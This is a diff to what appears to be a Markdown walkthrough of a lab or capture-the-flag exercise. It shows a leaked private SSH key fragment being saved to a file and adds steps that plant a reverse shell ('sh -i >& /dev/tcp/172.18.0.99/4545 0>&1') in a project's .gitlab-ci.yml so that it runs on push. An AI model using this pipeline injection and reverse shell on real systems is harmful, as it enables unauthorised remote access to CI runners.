@@ -112,3 +112,8 @@ PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
 ```
 - We can store it in a file. I don't like when the file is in the repository, so i just put it in the directory above with `nano ../id_rsa`. Dont forget the extra line on the end.
 - Now we must give the standard permissions to the *id_rsa* file with `chmod 600 ../id_rsa`.
+- Next step we must create a reverse shell to gitlab.
+- So we include the reverse shell in the `.gitlab-ci.yml`. This file will run our reverse shell after pushing the repo.
+- Just add a extra *-* line with the reverse shell under the existing one.
+`- sh -i >& /dev/tcp/172.18.0.99/4545 0>&1`
+- 
